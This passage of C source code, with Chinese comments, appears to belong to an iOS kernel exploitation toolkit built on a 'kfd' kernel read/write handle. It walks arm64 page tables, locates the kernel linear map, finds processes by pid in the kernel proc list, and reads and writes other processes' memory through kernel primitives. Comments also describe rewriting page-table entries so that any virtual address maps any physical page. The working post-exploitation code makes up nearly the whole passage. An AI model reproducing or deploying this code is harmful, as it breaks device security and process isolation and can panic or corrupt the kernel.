                 * vm_map 被写坏、进而内核 panic 的经典入口。
                 *
                 * 何况 after == before 这个判据证明不了写入生效：kwrite 完全
                 * 没落地时它照样成立。收益为零、风险为真，所以写入整段去掉。
                 */
                bool ok2 = false;
                const uint64_t after = km_read64(pte_kva, &ok2);

                snprintf(line, sizeof(line),
                         "pte: va=%#llx pa=%#llx pte=%#llx walk=OK pte_for=OK "
                         "readonly %s value=%#llx",
                         (unsigned long long)probeVa,
                         (unsigned long long)page_PA,
                         (unsigned long long)pte_PA,
                         (ok2 && after == before) ? "OK" : "MISMATCH",
                         (unsigned long long)(ok2 ? after : 0));
            }
        }
        used += (size_t)snprintf(out + used, outSize - used, "%s\n", line);
    }

    /*
     * 地址翻译层自检：拿 kernel_proc 本身走一遍页表。
     * 它是内核地址，翻出来的 PA 经线性映射补回后必须还是它自己 ——
     * 这一步同时验证了 pmap 取链、页表走法、线性映射基准三件事。
     */
    if (outSize > used) {
        uint64_t probe = kfd->info.kaddr.kernel_proc;
        bool ok = false;
        uint64_t pa = 0;
        if (probe) {
            ok = km_page_table_walk(g_current_pmap, probe, &pa);
        }
        snprintf(out + used, outSize - used,
                 "\npmap=%#llx walk(kernel_proc)=%s pa=%#llx linear=%s",
                 (unsigned long long)g_current_pmap,
                 probe ? (ok ? "OK" : "MISS") : "SKIP",
                 (unsigned long long)pa,
                 g_linear_map_valid ? "OK" : "UNRESOLVED");
        used += strlen(out + used);
    }

    /*
     * 目标进程读自证 —— 一次同时验证三件事：
     *   ① 页表遍历（km_translate）
     *   ② 线性映射补回（pa + g_linear_delta）
     *   ③ 经内核读写目标进程用户态地址（km_read_process）
     * 做法：拿自己进程的 Mach-O 头，一条走 km_read_process（页表翻译），
     * 另一条直接拿本进程地址读同一段（普通内存访问），两者必须逐字节一致。
     * 自己进程走的是同一套代码路径，所以这个比对能真实暴露翻译是否正确。
     */
    if (outSize > used) {
        const int32_t selfPid = kfd->info.env.pid;
        const uint64_t mh = (uint64_t)(uintptr_t)&_mh_execute_header;

        uint32_t viaProcess[2] = {};
        bool readOK = km_read_process(selfPid, mh, viaProcess, sizeof(viaProcess));

        uint32_t viaLocal[2] = {};
        if (readOK) {
            const uint32_t *local = (const uint32_t *)(uintptr_t)mh;
            viaLocal[0] = local[0];
            viaLocal[1] = local[1];
        }

        snprintf(out + used, outSize - used,
                 "\nself-read %#llx: %s proc(magic=%#x cpu=%#x) local(magic=%#x cpu=%#x) %s",
                 (unsigned long long)mh,
                 readOK ? "OK" : "FAIL",
                 viaProcess[0], viaProcess[1],
                 viaLocal[0], viaLocal[1],
                 (readOK && viaProcess[0] == viaLocal[0] && viaProcess[1] == viaLocal[1])
                     ? "MATCH" : "MISMATCH");
    }
}

#pragma mark - 地址翻译层

/*
 * arm64 16 KB 页的三级表几何。
 * 这些常量不属于「逐版本变动」的那一类 —— 页表几何由硬件页大小决定，
 * 换内核版本不会变，所以写在这里是安全的。
 */
#define KM_PAGE_SHIFT 14ULL
#define KM_PAGE_SIZE (1ULL << KM_PAGE_SHIFT)
#define KM_PAGE_MASK (KM_PAGE_SIZE - 1)
#define KM_L1_SHIFT 36ULL
#define KM_L2_SHIFT 25ULL
#define KM_L3_SHIFT 14ULL
#define KM_L1_MASK 0x0000000ff0000000ULL /* 11 bits at 36 */
#define KM_L2_MASK 0x0000000ffe000000ULL /* 11 bits at 25 */
#define KM_L3_MASK 0x0000000001ffc000ULL /* 11 bits at 14 */
#define KM_TTE_TYPE_BLOCK 0x0000000000000000ULL
#define KM_TTE_TYPE_TABLE 0x0000000000000002ULL
#define KM_TTE_TYPE_MASK 0x0000000000000002ULL
#define KM_TTE_PA_MASK 0x0000fffffffff000ULL

/// 用页表项算出下一级表的物理地址。
static uint64_t km_next_table_pa(uint64_t tte)
{
    return tte & KM_TTE_PA_MASK;
}

/// 内部：按 pmap 走页表，把 VA 翻成 PA。
static bool km_page_table_walk(uint64_t pmap, uint64_t va, uint64_t *pa_out)
{
    if (pmap == 0 || pa_out == NULL) {
        return false;
    }

    bool ok = false;
    uint64_t tte = km_read64(pmap + KM_PMAP_TTE_OFFSET, &ok);
    if (!ok || tte == 0) {
        return false;
    }
    uint64_t table = km_next_table_pa(tte);

    /*
     * L1 / L2 允许块描述符直接落地；L3 只认页描述符。
     *
     * 循环上界是 `level <= 2` 而不是 `< 3`：数组只有 3 个元素，走到 L3 之后
     * 必须在这里收尾。**不能依赖"L3 一定是块描述符"这个形态巧合**——
     * 一旦 L3 表项的 bit1 为 1（表描述符形态），旧写法会继续下一轮，
     * 读到 masks[3] / shifts[3]（越界读栈内存），再拿垃圾索引去 km_read64。
     */
    const uint64_t shifts[3] = { KM_L1_SHIFT, KM_L2_SHIFT, KM_L3_SHIFT };
    const uint64_t masks[3] = { KM_L1_MASK, KM_L2_MASK, KM_L3_MASK };

    for (int level = 0; level <= 2; level++) {
        uint64_t index = (va & masks[level]) >> shifts[level];
        uint64_t entry = km_read64(table + index * sizeof(uint64_t), &ok);
        if (!ok || (entry & 1) == 0) {
            return false;
        }

        if ((entry & KM_TTE_TYPE_MASK) == KM_TTE_TYPE_BLOCK) {
            *pa_out = (entry & KM_TTE_PA_MASK) | (va & KM_PAGE_MASK);
            return true;
        }

        /* L3 只认页描述符：到这一级还带 bit1 就说明表项形态不对，不继续往下走 */
        if (level == 2) {
            return false;
        }

        table = km_next_table_pa(entry);
    }

    return false;
}

/*
 * 与 km_page_table_walk 平行的一条路：走到最后一级后**返回那条页表项自身**
 * 的物理地址，而不是它描述的数据页。
 *
 * physrw 要的是前者 —— 拿到 PTE 的 PA 之后经线性映射补回 KVA，再用 kwrite
 * 改它，就能让任意 VA 指向任意物理页。
 *
 * 两个函数刻意分开：walk 是热路径（每次 km_read_process 都要走），
 * 多算一个 PTE 地址是白费；这个函数每次改写才用一次。
 *
 * 与 walk 一致的约定：L1 / L2 遇到块描述符（1GB / 32MB 大页）就返回 false
 * —— 那种情况下没有独立的 L3 表项可改。
 */
static bool km_pte_for(uint64_t pmap, uint64_t va, uint64_t *pte_pa_out)
{
    if (pmap == 0 || pte_pa_out == NULL) {
        return false;
    }

    bool ok = false;
    uint64_t tte = km_read64(pmap + KM_PMAP_TTE_OFFSET, &ok);
    if (!ok || tte == 0) {
        return false;
    }
    uint64_t table = km_next_table_pa(tte);

    const uint64_t shifts[3] = { KM_L1_SHIFT, KM_L2_SHIFT, KM_L3_SHIFT };
    const uint64_t masks[3] = { KM_L1_MASK, KM_L2_MASK, KM_L3_MASK };

    for (int level = 0; level < 3; level++) {
        uint64_t index = (va & masks[level]) >> shifts[level];
        uint64_t entry_pa = table + index * sizeof(uint64_t);

        /* 最后一级：这条就是我们要改的 PTE 自己 */
        if (level == 2) {
            uint64_t entry = km_read64(entry_pa, &ok);
            if (!ok || (entry & 1) == 0) {
                return false;
            }
            *pte_pa_out = entry_pa;
            return true;
        }

        uint64_t entry = km_read64(entry_pa, &ok);
        if (!ok || (entry & 1) == 0) {
            return false;
        }
        if ((entry & KM_TTE_TYPE_MASK) == KM_TTE_TYPE_BLOCK) {
            /* 大页没有独立 L3 表项，physrw 这条路对它无效 */
            return false;
        }
        table = km_next_table_pa(entry);
    }

    return false;
}

/// 内核 VA − PA：内核线性映射里这个差值对所有地址恒定，
/// 所以一次有效的观测就够，不需要去解析 gVirtBase / gPhysBase 的符号。
static bool km_compute_linear_delta(uint64_t pmap, uint64_t known_va,
                                    const char *reason, char *out, size_t outSize)
{
    uint64_t pa = 0;
    if (!km_page_table_walk(pmap, known_va, &pa)) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: walk failed", reason);
        }
        return false;
    }
    if (pa == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: pa is 0", reason);
        }
        return false;
    }
    g_linear_delta = known_va - pa;
    if ((g_linear_delta >> 40) == 0) {
        if (out && outSize) {
            snprintf(out, outSize, "%s: implausible delta %#llx",
                     reason, (unsigned long long)g_linear_delta);
        }
        return false;
    }
    if (out && outSize) {
        snprintf(out, outSize, "%s: delta=%#llx", reason,
                 (unsigned long long)g_linear_delta);
    }
    return true;
}

bool km_locate_linear_map(void)
{
    g_linear_map_valid = false;
    g_linear_delta = 0;

    if (g_handle == 0) {
        return false;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    g_current_pmap = kfd->info.kaddr.current_pmap;

    /*
     * 内核 VA 必须用 kernel_pmap 走。
     *
     * kernel_proc / current_proc 都是内核虚拟地址，早先这里用 current_pmap
     * （用户进程的 pmap）去 walk 它们 —— 语义就是错的：用户 pmap 的页表里
     * 没有内核空间的映射，要么走不通，要么走到一张不相干的表上，算出的
     * delta 自然也不成立。而 delta 一旦不成立，km_pte_for 补回来的 KVA 就
     * 指向别处。
     *
     * 这里优先用 kernel_pmap；它没填上（info_init 只在 kernel_proc 非 0 时
     * 才填）或走不通时，再退到原来的 current_pmap 路径 —— 只加不删，
     * 避免把原本能跑通的环境弄坏。
     */
    const uint64_t kpmap = kfd->info.kaddr.kernel_pmap;

    char note[192] = {};
    if (kpmap != 0 && kfd->info.kaddr.kernel_proc &&
        km_compute_linear_delta(kpmap, kfd->info.kaddr.kernel_proc,
                                "kernel_pmap+kernel_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located: %@", @(note));
        return true;
    }
    NSLog(@"[KernelMemory] kernel_pmap path unusable: %@", @(note));

    /*
     * 次选：仍是内核 VA，但换 kernel_proc 以外的锚点，pmap 仍优先 kernel_pmap。
     */
    if (kpmap != 0 && kfd->info.kaddr.current_proc &&
        km_compute_linear_delta(kpmap, kfd->info.kaddr.current_proc,
                                "kernel_pmap+current_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located: %@", @(note));
        return true;
    }

    /*
     * 兜底：沿用旧的 current_pmap 路径。
     */
    if (kfd->info.kaddr.kernel_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.kernel_proc,
                                "current_pmap+kernel_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located via legacy path: %@", @(note));
        return true;
    }

    if (kfd->info.kaddr.current_proc &&
        km_compute_linear_delta(g_current_pmap, kfd->info.kaddr.current_proc,
                                "current_pmap+current_proc", note, sizeof(note))) {
        g_linear_map_valid = true;
        NSLog(@"[KernelMemory] linear map located via legacy fallback: %@", @(note));
        return true;
    }

    NSLog(@"[KernelMemory] linear map unresolved: %@", @(note));
    return false;
}

bool km_linear_map_ready(void)
{
    return g_linear_map_valid;
}

uint64_t km_proc_for_pid(int32_t pid)
{
    if (g_handle == 0) {
        return 0;
    }

    struct kfd *kfd = (struct kfd *)g_handle;
    uint64_t kernel_proc = kfd->info.kaddr.kernel_proc;
    uint64_t current_proc = kfd->info.kaddr.current_proc;

    if (pid == kfd->info.env.pid && current_proc) {
        return current_proc;
    }
    if (kernel_proc == 0) {
        return 0;
    }

    const uint64_t off_next = dynamic_info(proc__p_list__le_prev) - 8;
    const uint64_t off_pid = dynamic_info(proc__p_pid);
    const uint64_t max_hops = 4096;

    bool ok = false;
    uint64_t node = kernel_proc;
    for (uint64_t i = 0; i < max_hops; i++) {
        uint64_t link = km_read64(node + off_next, &ok);
        if (!ok || link == 0 || link == kernel_proc) {
            break;
        }
        /* 明显不是内核指针就停，避免顺着被写坏的链跑飞。 */
        if (!km_is_kernel_address(link) || (link & 0x7) != 0) {
            break;
        }
        i32 candidate = (i32)km_read64(link + off_pid, &ok);
        if (ok && candidate == pid) {
            return link;
        }
        node = link;
    }

    return 0;
}

bool km_translate(int32_t pid, uint64_t uaddr, uint64_t *pa_out)
{
    if (!g_linear_map_valid || pa_out == NULL) {
        return false;
    }

    /*
     * dynamic_info(...) 展开成 kern_versions[kfd->info.env.vid].xxx，
     * 所以用到它的函数必须先有一个叫 `kfd` 的局部变量 —— 宏是靠名字
     * 捕获的，不是参数。这里补上，否则编译期就是「未声明标识符 kfd」。
     */
    struct kfd *kfd = (struct kfd *)g_handle;
    if (kfd == NULL) {
        return false;
    }

    uint64_t proc = km_proc_for_pid(pid);
    if (proc == 0) {
        return false;
    }

    bool ok = false;
    uint64_t task = proc + dynamic_info(proc__object_size);
    uint64_t map = km_read64(task + dynamic_info(task__map), &ok);
    if (!ok || !km_is_kernel_address(map)) {
        return false;
    }

    /* _vm_map.pmap 用 offsetof 算，定义在 static_info.h，与样本同源。 */
    uint64_t pmap = km_read64(map + offsetof(struct _vm_map, pmap), &ok);
    if (!ok || !km_is_kernel_address(pmap)) {
        return false;
    }

    return km_page_table_walk(pmap, uaddr, pa_out);
}

bool km_read_process(int32_t pid, uint64_t uaddr, void *out, uint64_t len)
{
    if (!g_linear_map_valid || out == NULL || len == 0) {
        return false;
    }

    uint8_t *cursor = (uint8_t *)out;
    uint64_t remaining = len;
    uint64_t addr = uaddr;

    /*
     * 按页走：一页内的物理页是连续的，跨页必须重新翻译。
     * 每次翻一次、整页读一次，避免按 8 字节粒度反复走表。
     */
    while (remaining > 0) {
        uint64_t pa = 0;
        if (!km_translate(pid, addr, &pa)) {
            return false;
        }

        uint64_t in_page = KM_PAGE_SIZE - (addr & KM_PAGE_MASK);
        uint64_t chunk = (remaining < in_page) ? remaining : in_page;
        uint64_t kva = pa + g_linear_delta;

        if (!km_read(kva, cursor, chunk)) {
            return false;
        }

        cursor += chunk;
        addr += chunk;
        remaining -= chunk;
    }

    return true;
}

bool km_write_process(int32_t pid, uint64_t uaddr, const void *in, uint64_t len)
{
    if (!g_linear_map_valid || in == NULL || len == 0) {
        return false;
    }
    /* 写原语逐 64 位落笔，非 8 的倍数没有定义。 */
    if ((len % sizeof(uint64_t)) != 0) {
        return false;
    }

    const uint8_t *cursor = (const uint8_t *)in;
    uint64_t remaining = len;
    uint64_t addr = uaddr;

    /*
     * 与 km_read_process 同构：按页翻译、整页写。
     * 页内物理页连续，所以一页只翻一次表。
     */
    while (remaining > 0) {
        uint64_t pa = 0;
        if (!km_translate(pid, addr, &pa)) {
            return false;
        }

        uint64_t in_page = KM_PAGE_SIZE - (addr & KM_PAGE_MASK);
        uint64_t chunk = (remaining < in_page) ? remaining : in_page;
        /* 写原语要求 8 字节对齐，页边界的余数留到下一轮。 */
        if ((chunk % sizeof(uint64_t)) != 0) {
            chunk -= (chunk % sizeof(uint64_t));
            if (chunk == 0) {
                return false;
            }
        }

        uint64_t kva = pa + g_linear_delta;
        if (!km_write(kva, cursor, chunk)) {
            return false;
        }

        cursor += chunk;
        addr += chunk;
        remaining -= chunk;
    }

    return true;
}
